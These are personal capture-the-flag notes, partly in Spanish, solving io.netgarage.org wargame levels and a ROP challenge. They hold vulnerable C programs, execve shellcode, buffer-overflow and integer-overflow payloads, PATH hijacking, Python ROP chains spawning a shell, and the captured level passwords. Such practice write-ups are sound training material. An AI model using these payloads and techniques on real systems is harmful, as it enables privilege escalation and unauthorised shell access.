@@ -1,0 +1,650 @@
+- Wargames
+
+
+http://smashthestack.org/index.html
+
+1.- ssh -l level1 io.netgarage.org -p2224
+ 
+ Solution: 271
+ TenFuck was here
+
+ cat /home/level2/.pass
+XNWFtWKWHhaaXoKI
+
+2.- ssh -l level2 io.netgarage.org -p2224
+
+
+ cat level02.c
+//a little fun brought to you by bla
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <unistd.h>
+
+void catcher(int a)
+{
+        setresuid(geteuid(),geteuid(),geteuid());
+        printf("WIN!\n");
+        system("/bin/sh");
+        exit(0);
+}
+
+int main(int argc, char **argv)
+{
+        puts("source code is available in level02.c\n");
+
+        if (argc != 3 || !atoi(argv[2]))
+                return 1;
+        signal(SIGFPE, catcher);
+        return abs(atoi(argv[1])) / atoi(argv[2]);
+}
+
+
+
+:/levels$ ./level02 -2147483648 -1
+source code is available in level02.c
+
+WIN!
+sh-4.3$ id
+uid=1003(level3) gid=1002(level2) groups=1002(level2),1029(nosu)
+
+cat /home/level3/.pass
+OlhCmdZKbuzqngfz
+
+
+
+ cat level02_alt.c
+/* submitted by noname */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+
+#define answer 3.141593
+
+void main(int argc, char **argv) {
+
+        float a = (argc - 2)?: strtod(argv[1], 0);
+
+        printf("You provided the number %f which is too ", a);
+
+
+        if(a < answer)
+                 puts("low");
+        else if(a > answer)
+                puts("high");
+        else
+                execl("/bin/sh", "sh", "-p", NULL);
+}
+
+ ./level02_alt NAN
+sh-4.3$ id
+uid=1002(level2) gid=1002(level2) euid=1003(level3) groups=1002(level2),1029(nosu)
+
+ cat level03.c
+ 
+//bla, based on work by beach
+
+#include <stdio.h>
+#include <string.h>
+
+void good()
+{
+        puts("Win.");
+        execl("/bin/sh", "sh", NULL);
+}
+void bad()
+{
+        printf("I'm so sorry, you're at %p and you want to be at %p\n", bad, good);
+}
+
+int main(int argc, char **argv, char **envp)
+{
+        void (*functionpointer)(void) = bad;
+        char buffer[50];
+
+        if(argc != 2 || strlen(argv[1]) < 4)
+                return 0;
+
+        memcpy(buffer, argv[1], strlen(argv[1]));
+        memset(buffer, 0, strlen(argv[1]) - 4);
+
+        printf("This is exciting we're going to %p\n", functionpointer);
+        functionpointer();
+
+        return 0;
+}
+
+
+
+./level03 `python -c 'print "A"*76+"\x74\x84\x04\x08"'`
+This is exciting we're going to 0x8048474
+Win.
+sh-4.3$ id
+uid=1003(level3) gid=1003(level3) euid=1004(level4) groups=1003(level3),1029(nosu)
+sh-4.3$ cat /home/level4/.
+./      ../     .pass   .vimrc
+sh-4.3$ cat /home/level4/.pass
+7WhHa5HWMNRAYl9T
+
+
+
+//writen by bla
+#include <stdlib.h>
+#include <stdio.h>
+
+int main() {
+        char username[1024];
+        FILE* f = popen("whoami","r");
+        fgets(username, sizeof(username), f);
+        printf("Welcome %s", username);
+
+        return 0;
+}
+
+
+
+level4@io:/tmp$ mkdir tenfuck
+level4@io:/tmp$ cd tenfuck
+level4@io:/tmp/tenfuck$ ls
+level4@io:/tmp/tenfuck$ echo "cat /home/level5/.pass" > whoami
+level4@io:/tmp/tenfuck$ ls
+whoami
+level4@io:/tmp/tenfuck$ chmod 777 whoami
+level4@io:/tmp/tenfuck$ ./whoami
+cat: /home/level5/.pass: Permission denied
+level4@io:/tmp/tenfuck$ PATH="/tmp/tenfuck:$PATH"
+level4@io:/tmp/tenfuck$ echo $PATH
+/tmp/tenfuck:/usr/local/radare/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+level4@io:/tmp/tenfuck$ ./whoami
+cat: /home/level5/.pass: Permission denied
+level4@io:/tmp/tenfuck$ /levels/level04
+Welcome DNLM3Vu0mZfX0pDd
+
+
+
+ cat level05.c
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char **argv) {
+        char buf[128];
+        if(argc < 2) return 1;
+        strcpy(buf, argv[1]);
+        printf("%s\n", buf);
+        return 0;
+}
+
+
+cat getenv.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+int main(int argc, char *argv[]) {
+        char *ptr;
+        if(argc < 3) {
+                printf("Usage: %s <environment var> <target program name>\n", ar    gv[0]);
+                exit(0);
+        }
+        ptr = getenv(argv[1]); /* Get env var location. */
+        ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name    . */
+        printf("%s will be at %p\n", argv[1], ptr);
+}
+
+
+ ./getenv EGG /levels/level05
+Pointer: 0xbffffe9b      LongArg0: 8     LongArg2: 15
+EGG will be at 0xbffffe8d
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+int main(int argc, char *argv[]) {
+        char *ptr;
+        if(argc < 3) {
+                printf("Usage: %s <environment var> <target program name>\n", argv[0]);
+                exit(0);
+        }
+        ptr = getenv(argv[1]); /* Get env var location. */
+        printf("Pointer: %p\t LongArg0: %d\t LongArg2: %d\n", ptr, strlen(argv[0]), strlen(argv[2]));
+        ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
+        printf("%s will be at %p\n", argv[1], ptr);
+}
+
+
+
+export EGG=$(python -c 'print "\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"')
+level5@io:/tmp/tenfuck2$ ./getenv EGG /levels/level05
+EGG will be at 0xbffffe8d
+level5@io:/tmp/tenfuck2$ /levels/level05 $(python -c "print 'A' * 140 + '\x8d\xfe\xff\xbf'")
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒▒▒▒
+sh-4.3$ whoami
+level6
+sh-4.3$ cat /home/level6/.pass
+fQ8W8YlSBJBWKV2R
+
+
+
+
+
+
+cat level06.c
+ 
+ 
+ 
+//written by bla
+//inspired by nnp
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+enum{
+LANG_ENGLISH,
+LANG_FRANCAIS,
+LANG_DEUTSCH,
+};
+
+int language = LANG_ENGLISH;
+
+struct UserRecord{
+        char name[40];
+        char password[32];
+        int id;
+};
+
+void greetuser(struct UserRecord user){
+        char greeting[64];
+        switch(language){
+                case LANG_ENGLISH:
+                        strcpy(greeting, "Hi "); break;
+                case LANG_FRANCAIS:
+                        strcpy(greeting, "Bienvenue "); break;
+                case LANG_DEUTSCH:
+                        strcpy(greeting, "Willkommen "); break;
+        }
+        strcat(greeting, user.name);
+        printf("%s\n", greeting);
+}
+
+int main(int argc, char **argv, char **env){
+        if(argc != 3) {
+                printf("USAGE: %s [name] [password]\n", argv[0]);
+                return 1;
+        }
+
+        struct UserRecord user = {0};
+        strncpy(user.name, argv[1], sizeof(user.name));
+        strncpy(user.password, argv[2], sizeof(user.password));
+
+        char *envlang = getenv("LANG");
+        if(envlang)
+                if(!memcmp(envlang, "fr", 2))
+                        language = LANG_FRANCAIS;
+                else if(!memcmp(envlang, "de", 2))
+                        language = LANG_DEUTSCH;
+
+        greetuser(user);
+}
+
+cat level06_alt.c
+
+
+
+#include <stdio.h>
+#include <sys/fcntl.h>
+#include <unistd.h>
+#include <string.h>
+
+char pass[32];
+
+int main(int argc, char * argv[])
+{
+
+        char buf[32];
+        FILE *f;
+
+        f = fopen("/levels/level06_alt.pass", "r");
+
+        fgets(pass, 32, f);
+        fgets(buf, 999, stdin);
+
+        if(!strcmp(buf, pass)) {
+                printf("Success!\n");
+                setreuid(geteuid(), geteuid());
+                execl("/bin/sh", NULL, NULL);
+        }
+
+        return 0;
+}
+
+
+ x/100xw $esp
+
+0x8049920 pass
+
+0x80498a0
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCCCDDDDDDDDDDDDDDDDDDDDDDDDD
+
+40 y 29
+
+
+$(python -c "print '\x90' *17 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + ' '+  'B'* 28 + '\x11\xfe\xff\xbf'")
+
+/levels/level06 $(python -c "print '\x90' *17 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + ' '+  'B'* 25 + '\xe0\xfb\xff\xbf'")
+
+
+ cat /levels/level06_alt.pass
+It1sInTheLittleThings
+
+sh-4.3$ cat /home/level7/.pass
+U3A6ZtaTub14VmwV
+
+
+
+/tmp/tenfuck3/bbbbbbbbbb
+2f 74 6d 70 2f 74 65 6e 66 75 63 6b 33 2f 62 62 62 62 62 62 62 62 62 62
+
+
+
+2f 6c 65 76 65 6c 73 2f 6c 65 76 65 6c 30 36 5f 61 6c 74 2e 70 61 73 73
+
+
+0x0804a008
+
+/levels/level06_alt <<< $(python -c 'print "A"*216 + "\x08\xa0\x04\x08"')
+
+<<< $(python -c 'print "A"*210 + "\xa0\x98\04\08"')
+
+
+cat level07.c
+
+//written by bla
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+
+
+
+int main(int argc, char **argv)
+{
+
+        int count = atoi(argv[1]);
+        int buf[10];
+
+        if(count >= 10 )
+                return 1;
+
+
+        memcpy(buf, argv[2], count * sizeof(int));
+
+        if(count == 0x574f4c46) {
+                printf("WIN!\n");
+                execl("/bin/sh", "sh" ,NULL);
+        } else
+                printf("Not today son\n");
+
+
+        return 0;
+}
+
+
+ set {int}0xbffffc7c = 0x574f4c46
+ 
+$ echo "ibase=16; C0" | bc
+192
+for hex-to-decimal, and:
+
+$ echo "obase=16; 192" | bc
+C0
+for decimal-to-hex.
+ 
+
+./level07  $(echo "(-2^31)+(72/4)"|bc) $(python -c 'print "\x46\x4c\x4f\x57" * (72/4)')
+WIN!
+sh-4.3$ cat /home/level8/.pass
+VSIhoeMkikH6SGht
+
+level7@io:/levels$ cat level07_alt.c
+/*
+    Coding by LarsH
+
+    PJYN GIEZIRC FRD RBNE OM QNML PE ZMP PJM BMPPMI AIMHQMDFYMN AIEC R PMUP,
+    TJYFJ JMBGN TJMD FIRFWYDZ NPRDLRIL CEDENQONPYPQPYED FYGJMIN.
+
+*/
+
+#include <stdio.h>
+
+static int count[256];
+
+int main(int argc, char **argv) {
+
+    int i, j;
+
+    if(argc == 1) {
+        printf("Usage: %s words\n", argv[0]);
+        return 1;
+    }
+
+    /* Clear out the frequency buffer */
+    for(i=0; i<256; i++)
+        count[i] = 0;
+
+    /* Fill the frequency buffer */
+    for(j=1; argv[j]; j++)
+        for(i=0; argv[j][i]; i++)
+            count[argv[j][i]]++;
+
+    /* Print out the frequency buffer */
+    for(i=0; i<256; i++)
+        if(count[i])
+            printf("%c found %i time%s\n", i, count[i], count[i]-1?"s":"");
+
+    return 0;
+}
+
+
+
+ cat level08.cpp
+// writen by bla for io.netgarage.org
+#include <iostream>
+#include <cstring>
+#include <unistd.h>
+
+class Number
+{
+        public:
+                Number(int x) : number(x) {}
+                void setAnnotation(char *a) {memcpy(annotation, a, strlen(a));}
+                virtual int operator+(Number &r) {return number + r.number;}
+        private:
+                char annotation[100];
+                int number;
+};
+
+
+int main(int argc, char **argv)
+{
+        if(argc < 2) _exit(1);
+
+        Number *x = new Number(5);
+        Number *y = new Number(6);
+        Number &five = *x, &six = *y;
+
+        five.setAnnotation(argv[1]);
+
+        return six + five;
+}
+
+
+
+
+
+Level10-Ropme:
+
+http://wargame2k10.nuitduhack.com/
+http://danigargu.blogspot.com.es/2013/01/having-fun-with-rop-nxaslr-bypass-linux_18.html
+
+Básicamente se trata de seguir la guia de arriba:
+
+1.- Usar ropeme(ropshell.py) para encontrar gagdgets con los que ir saltando de ret en ret para adecuar los registros y la pila a una llamada a execve
+
+./ropshell.py
+generate ./level10_ropme
+load ./level10_ropme.ggt
+search ....
+
+
+Gadgets a utilizar
+
+    1.- 0x8052341L: pop edx ; pop ecx ; pop ebx ;;
+    2.- 0x80853a6L: inc ecx ; adc al 0x39 ;;
+    3.- 0x804ece9L: inc edx ; add al 0x83 ;;
+    4.- 0x804825cL: xor eax eax ; inc eax ;;
+    5.- 0x804825eL: inc eax ;;
+    6.- 0x8048260L: int 0x80 ; pop ebp ;;
+
+Con estos 6 gadgets tenemos suficiente para hacer una llamada a execve, ya que tenemos el control sobre eax (4, 5), ebx (1), ecx (1, 2) y edx (1, 3). Ahora tenemos que conseguir que dichos registros tengan los siguientes valores:
+
+    EAX = 0xb (syscall execve)
+    EBX = puntero a cadena
+    ECX = 0x0 (NULL)
+    EDX = 0x0 (NULL)
+	
+
+2.- El puntero a cadena se puede solucionar de dos maneras dependiendo si tenemos ASLR activado:
+
+	- Sin ASLR: Generamos una variable de entorno y pasamos esa dirección a EBX:
+		export EGG='/bin/sh'
+		./getenv EGG ./level10_ropme
+		Var is stored at address 0xbffffb76
+		Pointer: 0xbffffb76	 LongArg0: 8	 LongArg2: 15
+		EGG will be at 0xbffffb68
+		
+		
+	
+El fichero python quedaría así:
+#!/usr/bin/python
+#
+# Exploit ROP
+#
+ 
+from struct import pack
+ 
+binary = "level10"
+junk = "A" * 12
+
+shell_string = pack('<I', 0xbffffb68) # string: cntrl
+
+ 
+rop = pack('<I', 0x08052318)    # pop edx 
+rop += pack('<I', 0xffffffff)   # pop edx (ebx = 0xffffffff)
+rop += pack('<I', 0x0806568a)	# pop ecx
+rop += pack('<I', 0xffffffff)   # pop ecx (ebc = 0xffffffff)
+rop += pack('<I', 0x08052343)	# pop ebx
+rop += shell_string             # pop ebx (ebx = 0x080b1953)
+rop += pack('<I', 0x080853a6)   # inc ecx ; adc al 0x39 ;; (ecx = 0x0)
+rop += pack('<I', 0x080687c3)   # inc edx ; add al 0x83 ;; (edx = 0x0)
+rop += pack('<I', 0x0804825c)   # xor eax eax ; inc eax ;; (eax = 0x1)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x2)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x3)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x4)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x5)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x6)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x7)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x8)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x9)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0xa)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x9)
+rop += pack('<I', 0x08048260)   # int 0x80 ; pop ebp ;;
+#rop += pack('<I', 0x08052a00)   # int 0x80 ; pop ebp ;;
+rop += pack('<I', 0x0806568a)	# pop ecx
+
+payload = junk + rop 
+ 
+print payload
+
+# Fin fichero python
+
+Nota: Cuando llamas a int 0x80 no se puede utilizar solo la llamada a la función porque no funciona, tiene que tener otra microinstrucción detrás. Es algo raro para investigar:
+
+rop += pack('<I', 0x08048260)   # int 0x80 ; pop ebp ;;
+#rop += pack('<I', 0x08052a00)   # int 0x80 ;; <---- Con esto no funciona ¿?
+
+
+
+		
+	- Con ASLR: Buscar una cadena en una sección no randomizable para luego crearnos un pequeño binario con el nombre de esa cadena que nos brinde un shell:
+		rabin2 -z level10_ropme | grep -A 4 cntrl
+		Warning: Cannot initialize dynamic strings
+		vaddr=0x080b1953 paddr=0x00069953 ordinal=738 sz=6 len=5 section=.rodata type=ascii string=cntrl
+		vaddr=0x080b195f paddr=0x0006995f ordinal=740 sz=6 len=5 section=.rodata type=ascii string=alnum
+		
+		La dirección 0x080b1953 es la tendremos asignar a cntrl_string en exploit.py
+		
+		Elegimos cntrl y nos creamos la shell:
+		
+		cat cntrl.c
+		#include <stdio.h>
+		#include <unistd.h>
+		 
+		int main(void)
+		{
+		 int euid = geteuid();
+		 setreuid(euid, euid);
+		 execv("/bin/sh", NULL);
+		}
+		
+		
+
+#!/usr/bin/python
+#
+# Exploit ROP con ASLR
+#
+ 
+from struct import pack
+ 
+binary = "level10"
+junk = "A" * 12
+ 
+cntrl_string = pack('<I', 0x080b1953) # string: cntrl
+
+ 
+rop = pack('<I', 0x08052341)    # pop edx ; pop ecx ; pop ebx ;;
+rop += pack('<I', 0xffffffff)   # pop edx (ebx = 0xffffffff)
+rop += pack('<I', 0xffffffff)   # pop ecx (ebc = 0xffffffff)
+rop += cntrl_string             # pop ebx (ebx = 0x080b1953)
+rop += pack('<I', 0x080853a6)   # inc ecx ; adc al 0x39 ;; (ecx = 0x0)
+rop += pack('<I', 0x0804ece9)   # inc edx ; add al 0x83 ;; (edx = 0x0)
+rop += pack('<I', 0x0804825c)   # xor eax eax ; inc eax ;; (eax = 0x1)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x2)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x3)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x4)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x5)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x6)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x7)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x8)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x9)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0xa)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0xb -> execve())
+rop += pack('<I', 0x08048260)   # int 0x80 ; pop ebp ;;
+
+fin = "\x90\x90\x90\x90\xfc\xf2\xff\xbf"
+#payload = "\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"
+payload = "\xeb\x10\x5e\x31\xc0\x88\x46\x07\xb0\x0b\x89\xf3\x31\xc9\x31\xd2\xcd\x80\xe8\xeb\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23"
+
+payload = junk + rop 
+ 
+print payload
+
+# Fin fichero python
+	
+	
+- Wargame https://exploit-exercises.com
+
+exploit-exercises-protostar-2.iso
+exploit-exercises-nebula-5.iso
